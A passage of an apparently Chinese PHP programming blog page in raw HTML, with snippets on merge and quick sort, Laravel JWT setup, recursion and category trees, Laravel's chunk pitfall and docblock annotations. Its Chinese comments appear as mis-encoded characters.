class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å½’å¹¶æ’åº</span></span><br><span class="line"><span class="comment"> * @param $arr</span></span><br><span class="line"><span class="comment"> * @return array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeSort</span>(<span class="params">$arr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $arrCount = count($arr);</span><br><span class="line">    <span class="keyword">if</span> ($arrCount &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $arr;</span><br><span class="line">    &#125;</span><br><span class="line">    $mid = ceil($arrCount / <span class="number">2</span>); <span class="comment">// å‘ä¸Šå–æ•´ä¸€ä¸‹</span></span><br><span class="line">    $leftArr = array_slice($arr, <span class="number">0</span>, $mid);</span><br><span class="line">    $rightArr = array_slice($arr, $mid, $arrCount - $mid);</span><br><span class="line">    <span class="keyword">return</span> mergeArr(mergeSort($leftArr), mergeSort($rightArr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æœ€ç»ˆåˆå¹¶æ•°ç»„çš„æ–¹æ³•</span></span><br><span class="line"><span class="comment"> * @param $leftArr</span></span><br><span class="line"><span class="comment"> * @param $rightArr</span></span><br><span class="line"><span class="comment"> * @return array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeArr</span>(<span class="params">$leftArr, $rightArr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    $j = <span class="number">0</span>;</span><br><span class="line">    $returnArr = [];</span><br><span class="line">    <span class="keyword">while</span> ($i &lt; count($leftArr) &amp;&amp; $j &lt; count($rightArr)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($leftArr[$i] &lt; $rightArr[$j]) &#123;</span><br><span class="line">            $returnArr[] = $leftArr[$i];</span><br><span class="line">            $i++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($leftArr[$i] &gt; $rightArr[$j]) &#123;</span><br><span class="line">            $returnArr[] = $rightArr[$j];</span><br><span class="line">            $j++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $returnArr[] = $leftArr[$i];</span><br><span class="line">            $returnArr[] = $rightArr[$j];</span><br><span class="line">            $i++;</span><br><span class="line">            $j++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($temp = $i; $temp &lt; count($leftArr); $temp++) &#123;</span><br><span class="line">        $returnArr[] = $leftArr[$temp];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($temp = $j; $temp &lt; count($rightArr); $temp++) &#123;</span><br><span class="line">        $returnArr[] = $rightArr[$temp];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $returnArr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å¿«é€Ÿæ’åºhttps://www.h57.pw/2017/04/10/thinking-about-divide-and-conquer-by-sorting-fast-merging/</span></span><br><span class="line"><span class="comment"> * @param $arr</span></span><br><span class="line"><span class="comment"> * @return array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">quickSort</span>(<span class="params">$arr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (count($arr) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $arr;</span><br><span class="line">    &#125;</span><br><span class="line">    $flag = $arr[<span class="number">0</span>];</span><br><span class="line">    $lessArr = [];</span><br><span class="line">    $largeArr = [];</span><br><span class="line">    $flagArr = [];</span><br><span class="line">    $flagArr[] = $flag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt; count($arr); $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($arr[$i] &lt; $flag) &#123;</span><br><span class="line">            $lessArr[] = $arr[$i];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($arr[$i] &gt; $flag) &#123;</span><br><span class="line">            $largeArr[] = $arr[$i];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $flagArr[] = $arr[$i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> array_merge(quickSort($lessArr), $flagArr, quickSort($largeArr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Jwtå‰åç«¯åˆ†ç¦»"><a href="#Jwtå‰åç«¯åˆ†ç¦»" class="headerlink" title="Jwtå‰åç«¯åˆ†ç¦»"></a>Jwtå‰åç«¯åˆ†ç¦»</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">vi composer.json </span><br><span class="line"><span class="string">"require"</span>: &#123;</span><br><span class="line">        <span class="string">"tymon/jwt-auth"</span>: <span class="string">"1.0.*"</span></span><br><span class="line">    &#125;,</span><br><span class="line"> php artisan jwt:secret</span><br><span class="line"> https:<span class="comment">//www.njphper.com/posts/cd8c881c.html</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span> <span class="title">implements</span> <span class="title">AuthenticatableContract</span>, <span class="title">AuthorizableContract</span>, <span class="title">JWTSubject</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     use Authenticatable, Authorizable;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * The attributes that are mass assignable.</span></span><br><span class="line"><span class="comment">      *</span></span><br><span class="line"><span class="comment">      * @var array</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     protected $fillable = [</span><br><span class="line">         <span class="string">'name'</span>, <span class="string">'email'</span>,</span><br><span class="line">     ];</span><br><span class="line"> </span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">      * The attributes excluded from the model's JSON form.</span></span><br><span class="line"><span class="comment">      *</span></span><br><span class="line"><span class="comment">      * @var array</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">     protected $hidden = [</span><br><span class="line">         <span class="string">'password'</span>,</span><br><span class="line">     ];</span><br><span class="line"> </span><br><span class="line"> 	<span class="comment">/**</span></span><br><span class="line"><span class="comment"> 	 * Get the identifier that will be stored in the subject claim of the JWT.</span></span><br><span class="line"><span class="comment"> 	 *</span></span><br><span class="line"><span class="comment"> 	 * @return mixed</span></span><br><span class="line"><span class="comment"> 	 */</span></span><br><span class="line"> 	public <span class="function"><span class="keyword">function</span> <span class="title">getJWTIdentifier</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> 	</span>&#123;</span><br><span class="line"> 		<span class="keyword">return</span> $<span class="keyword">this</span>-&gt;getKey();</span><br><span class="line"> 	&#125;</span><br><span class="line"> </span><br><span class="line"> 	<span class="comment">/**</span></span><br><span class="line"><span class="comment"> 	 * Return a key value array, containing any custom claims to be added to the JWT.</span></span><br><span class="line"><span class="comment"> 	 *</span></span><br><span class="line"><span class="comment"> 	 * @return array</span></span><br><span class="line"><span class="comment"> 	 */</span></span><br><span class="line"> 	public <span class="function"><span class="keyword">function</span> <span class="title">getJWTCustomClaims</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> 	</span>&#123;</span><br><span class="line"> 		<span class="keyword">return</span> [];</span><br><span class="line"> 	&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<h3 id="é€’å½’"><a href="#é€’å½’" class="headerlink" title="é€’å½’"></a>é€’å½’</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">&amp; å¼•ç”¨èµ‹å€¼</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doloop1</span>(<span class="params">&amp;$i = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    print_r($i);</span><br><span class="line">    $i++;</span><br><span class="line">    <span class="keyword">if</span> ($i &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">        doloop1($i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">doloop1();</span><br><span class="line"><span class="keyword">static</span> é™æ€å˜é‡https:<span class="comment">//learnku.com/articles/28252#topnav</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doloop2</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> $i = <span class="number">1</span>;</span><br><span class="line">    print_r($i);</span><br><span class="line">    $i++;</span><br><span class="line">    <span class="keyword">if</span> ($i &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">        doloop2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">doloop2();</span><br><span class="line">global å…¨å±€å˜é‡</span><br><span class="line">$i = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doloop3</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    global $i;</span><br><span class="line">    echo $i;</span><br><span class="line">    $i++;</span><br><span class="line">    <span class="keyword">if</span> ($i &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">        doloop3();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">doloop3();</span><br><span class="line">$data = [</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">1</span>, <span class="string">'title'</span> =&gt; <span class="string">'Electronics'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">0</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">2</span>, <span class="string">'title'</span> =&gt; <span class="string">'Laptops &amp; PC'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">3</span>, <span class="string">'title'</span> =&gt; <span class="string">'Laptops'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">2</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">4</span>, <span class="string">'title'</span> =&gt; <span class="string">'PC'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">2</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">5</span>, <span class="string">'title'</span> =&gt; <span class="string">'Cameras &amp; photo'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">6</span>, <span class="string">'title'</span> =&gt; <span class="string">'Camera'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">5</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">7</span>, <span class="string">'title'</span> =&gt; <span class="string">'Phones &amp; Accessories'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">8</span>, <span class="string">'title'</span> =&gt; <span class="string">'Smartphones'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">7</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">9</span>, <span class="string">'title'</span> =&gt; <span class="string">'Android'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">8</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">10</span>, <span class="string">'title'</span> =&gt; <span class="string">'iOS'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">8</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">11</span>, <span class="string">'title'</span> =&gt; <span class="string">'Other Smartphones'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">8</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">12</span>, <span class="string">'title'</span> =&gt; <span class="string">'Batteries'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">7</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">13</span>, <span class="string">'title'</span> =&gt; <span class="string">'Headsets'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">7</span>],</span><br><span class="line">            [<span class="string">'id'</span> =&gt; <span class="number">14</span>, <span class="string">'title'</span> =&gt; <span class="string">'Screen Protectors'</span>, <span class="string">'parent_id'</span> =&gt; <span class="number">7</span>],</span><br><span class="line">        ];</span><br><span class="line">è·å–æ— é™æåˆ†ç±»</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å€¼å¼•ç”¨è·å–æ— é™æåˆ†ç±»æ ‘</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param array $data</span></span><br><span class="line"><span class="comment"> * [[[@return](https://learnku.com/users/31554)](https://learnku.com/users/31554)](https://learnku.com/users/31554) array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_tree</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    $refer = array();  </span><br><span class="line">    $tree = array();  </span><br><span class="line">    foreach($data <span class="keyword">as</span> $k =&gt; $v)&#123;  </span><br><span class="line">        $refer[$v[<span class="string">'id'</span>]] = &amp; $data[$k];  <span class="comment">//åˆ›å»ºä¸»é”®çš„æ•°ç»„å¼•ç”¨  </span></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    foreach($data <span class="keyword">as</span> $k =&gt; $v)&#123;  </span><br><span class="line">        $parent_id = $v[<span class="string">'parent_id'</span>];   <span class="comment">//è·å–å½“å‰åˆ†ç±»çš„çˆ¶çº§id  </span></span><br><span class="line">        <span class="keyword">if</span>($parent_id == <span class="number">0</span>)&#123;  </span><br><span class="line">            $tree[] = &amp; $data[$k];   <span class="comment">//é¡¶çº§æ ç›®</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">            <span class="keyword">if</span>(isset($refer[$parent_id]))&#123;  </span><br><span class="line">                $refer[$parent_id][<span class="string">'children'</span>][] = &amp; $data[$k];  <span class="comment">//å¦‚æœå­˜åœ¨çˆ¶çº§æ ç›®ï¼Œåˆ™æ·»åŠ è¿›çˆ¶çº§æ ç›®çš„å­æ ç›®æ•°ç»„ä¸­  </span></span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $tree;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * é€’å½’è·å–æ— é™æåˆ†ç±»æ ‘</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param array $data</span></span><br><span class="line"><span class="comment"> * @param int $parent_id</span></span><br><span class="line"><span class="comment"> * @param int $level</span></span><br><span class="line"><span class="comment"> * [[[@return](https://learnku.com/users/31554)](https://learnku.com/users/31554)](https://learnku.com/users/31554) array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_tree2</span>(<span class="params">$data = [], $parent_id = <span class="number">0</span>, $level = <span class="number">0</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $tree = [];</span><br><span class="line">    <span class="keyword">if</span> ($data &amp;&amp; is_array($data)) &#123;</span><br><span class="line">        foreach ($data <span class="keyword">as</span> $v) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($v[<span class="string">'parent_id'</span>] == $parent_id) &#123;</span><br><span class="line">                $tree[] = [</span><br><span class="line">                    <span class="string">'id'</span> =&gt; $v[<span class="string">'id'</span>],</span><br><span class="line">                    <span class="string">'level'</span> =&gt; $level,</span><br><span class="line">                    <span class="string">'title'</span> =&gt; $v[<span class="string">'title'</span>],</span><br><span class="line">                    <span class="string">'parent_id'</span> =&gt; $v[<span class="string">'parent_id'</span>],</span><br><span class="line">                    <span class="string">'children'</span> =&gt; make_tree2($data, $v[<span class="string">'id'</span>], $level + <span class="number">1</span>),</span><br><span class="line">                ];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tree;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Laravelä¸­chunkæ–¹æ³•åˆ†å—å¤„ç†æ•°æ®çš„å‘"><a href="#Laravelä¸­chunkæ–¹æ³•åˆ†å—å¤„ç†æ•°æ®çš„å‘" class="headerlink" title="Laravelä¸­chunkæ–¹æ³•åˆ†å—å¤„ç†æ•°æ®çš„å‘"></a>Laravelä¸­chunkæ–¹æ³•åˆ†å—å¤„ç†æ•°æ®çš„å‘</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">chunk</span>(<span class="params">$count, callable $callback</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// æˆ‘ç†è§£çš„æ˜¯ç±»ä¼¼äºlimit,offset å®ç°æ•°æ®åˆ†é¡µæŸ¥è¯¢  </span></span><br><span class="line">    $results = $<span class="keyword">this</span>-&gt;forPage($page = <span class="number">1</span>, $count)-&gt;get();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (count($results) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// On each chunk result set, we will pass them to the callback and then let the</span></span><br><span class="line">        <span class="comment">// developer take care of everything within the callback, which allows us to</span></span><br><span class="line">        <span class="comment">// keep the memory low for spinning through large result sets for working.</span></span><br><span class="line">        <span class="comment">// å¦‚æœç”¨æˆ·å›è°ƒä¸­ï¼Œæ›´æ–°çš„å­—æ®µä¸æŸ¥è¯¢çš„å­—æ®µæ˜¯ä¸€ä¸ªæ¡ä»¶ï¼Œå°±ä¼šå‡ºç°è¿™æ ·çš„é—®é¢˜             </span></span><br><span class="line">        <span class="keyword">if</span> (call_user_func($callback, $results) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $page++;</span><br><span class="line"></span><br><span class="line">        $results = $<span class="keyword">this</span>-&gt;forPage($page, $count)-&gt;get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 1.å…ˆå»æŸ¥è¯¢éœ€è¦æ›´æ–°çš„æ•°æ®é‡ </span></span><br><span class="line">    $count = DB::table(<span class="string">'table'</span>)</span><br><span class="line">               -&gt;where(<span class="string">'status'</span>, <span class="string">'='</span>, <span class="number">0</span>)</span><br><span class="line">               -&gt;count();</span><br><span class="line">    echo <span class="string">"éœ€è¦æ¨é€çš„æ•°é‡:$count\r\n"</span>;</span><br><span class="line">    <span class="keyword">while</span> ($count) &#123;</span><br><span class="line">        <span class="comment">// 2.ç„¶ålimitå»æŸ¥æ•°æ® </span></span><br><span class="line">        $data= DB::table(self::OPEN_API_WUBA_TEST_CLUE)</span><br><span class="line">                 -&gt;where(<span class="string">'is_push'</span>, <span class="string">'='</span>, <span class="attr">self</span>::IS_PUSH_FAILED)</span><br><span class="line">                 -&gt;limit(<span class="number">100</span>)</span><br><span class="line">                 -&gt;get();</span><br><span class="line">        ! empty($data) &amp;&amp; $<span class="keyword">this</span>-&gt;processData($data);</span><br><span class="line">        <span class="comment">// 3.æ‰¹æ¬¡å¤„ç†å®Œæ•°æ®ï¼Œå†å»æŸ¥è¯¢ä¸‹ éœ€è¦æ›´æ–°çš„æ•°æ®ï¼Œç›´åˆ°æ›´æ–°å®Œæ¯•é€€å‡ºå¾ªç¯  </span></span><br><span class="line">        $count = DB::table(<span class="string">'table'</span>)</span><br><span class="line">                   -&gt;where(<span class="string">'status'</span>, <span class="string">'='</span>, <span class="number">0</span>)</span><br><span class="line">                   -&gt;count();</span><br><span class="line">        echo <span class="string">"å‰©ä½™æ¨é€çš„è®°å½•æ•°:$count\r\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    exit(<span class="string">"æ•°æ®å…¨éƒ¨æ¨é€å®Œæ¯•.\r\n"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private <span class="function"><span class="keyword">function</span> <span class="title">processData</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// TODO(xiaoyi):å¤„ç†æ•°æ®ä¸šåŠ¡é€»è¾‘https://segmentfault.com/a/1190000015284897</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ä»£ç ç»†èŠ‚"><a href="#ä»£ç ç»†èŠ‚" class="headerlink" title="ä»£ç ç»†èŠ‚"></a>ä»£ç ç»†èŠ‚</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">ä¸€ä¸ªæ•°ç»„å¯¹è±¡æˆå‘˜ï¼Œä½ çŸ¥é“æ€ä¹ˆå†™å—ï¼Ÿ</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @var Ads[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public $adsList = [];</span><br><span class="line">ç±»çš„é­”æœ¯æ–¹æ³•è°ƒç”¨çš„æ³¨é‡Šï¼Œä½ çŸ¥é“æ€ä¹ˆå†™å—ï¼Ÿhttps:<span class="comment">//yq.aliyun.com/articles/691719?spm=a2c4e.11153959.0.0.1a265ee3ENEDVQ</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @link http://manual.phpdoc.org/HTMLframesConverter/default/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @method static int search(string $query, $limit = 10, $offset = 0)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SearchServiceProxy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params">$method, $arguments</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!method_exists(<span class="string">"SearchService"</span>, $method)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \LogicException(__CLASS__ . <span class="string">"::"</span> . $method . <span class="string">" not found"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $data = call_user_func_array([<span class="string">"SearchService"</span>, $method], $<span 